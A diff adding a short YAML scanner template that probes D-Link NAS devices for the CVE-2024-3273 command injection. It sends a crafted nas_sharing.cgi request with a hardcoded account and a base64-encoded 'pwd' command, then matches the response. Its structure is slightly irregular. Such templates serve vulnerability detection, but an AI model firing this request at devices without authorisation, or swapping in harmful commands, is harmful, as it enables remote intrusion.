@@ -1,0 +1,8 @@
+name: poc-yaml-D-LinkNAS-cmd
+description: "远程命令执行漏洞(CVE-2024-3273)"
+method: GET
+  - "/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=cHdk"
+expression:
+  status: 200
+  body_all:
+    - "var"
